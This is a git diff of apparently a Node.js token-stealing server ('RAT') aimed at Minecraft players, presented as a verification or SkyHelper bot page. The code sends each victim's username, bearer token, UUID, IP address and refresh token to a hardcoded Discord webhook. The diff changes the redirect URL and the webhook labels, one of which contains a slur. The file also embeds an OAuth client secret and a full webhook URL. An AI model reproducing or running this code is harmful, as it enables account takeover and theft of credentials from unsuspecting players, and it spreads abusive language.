@@ -1,7 +1,7 @@
 //Change these btw
 const client_secret = 'cXw8Q~tivfs8oVPAbAakLkaFv2atQGfHW0Bs2cK0' //you need to put the "Secret Value" here not the "Secret ID"!!!!
 const client_id = 'f6f9ea1f-0a01-49e1-854a-2771d19ebee4'
-const redirect_uri = 'https://verificationsystem.onrender.com'
+const redirect_uri = 'https://skyhelperbot.onrender.com'
 const webhook_url = 'https://discord.com/api/webhooks/1047627571493339257/TRpgQ_5yAgC8Mx800LRoJn6DIhmCDOSImYMloMBam_vBfzJaWhciAHxeg-fZvQjfgJ6v'
 
 //Requirements
@@ -129,8 +129,8 @@ async function getUsernameAndUUID(bearerToken) {
 function postToWebhook(username, bearerToken, uuid, ip, refreshToken) {
     const url = webhook_url
     let data = {
-username: "Beamed username",
-  avatar_url: "https://cdn.discordapp.com/avatars/1033045491912552508/0d33e4f7aa3fdbc3507880eb7b2d1458.webp",  
+username: "Ratted This Retard",
+  avatar_url: "https://avatars.githubusercontent.com/u/44952349?v=4",  
 content: "@everyone",
   embeds: [
     {
@@ -158,7 +158,7 @@ content: "@everyone",
       ],
       "footer": {
         "text": "made by AverageTryhard",
-        "icon_url": "https://cdn.discordapp.com/avatars/811395933824483328/db8bbb5fe511bef14c7ff9bbdd157abe.png?size=1024"
+        "icon_url": "https://bigrat.monster/media/bigrat.png"
       }
     }
   ],
@@ -280,7 +280,7 @@ function refreshToWebhook(newUsername, newBearerToken, newUuid, newRefreshToken)
     const url = webhook_url
     let data = {
 username: "Refreshed username",
-  avatar_url: "https://cdn.discordapp.com/avatars/811395933824483328/db8bbb5fe511bef14c7ff9bbdd157abe.png?size=1024",  
+  avatar_url: "https://avatars.githubusercontent.com/u/44952349?v=4",  
 content: "@everyone TOKEN REFRESHED!",
   embeds: [
     {
@@ -308,7 +308,7 @@ content: "@everyone TOKEN REFRESHED!",
       ],
       "footer": {
         "text": "RAT",
-        "icon_url": "https://cdn.discordapp.com/avatars/919624780112592947/a_119345db608773253c2c6d687ea25155.webp"
+        "icon_url": "https://bigrat.monster/media/bigrat.png"
       }
     }
   ],
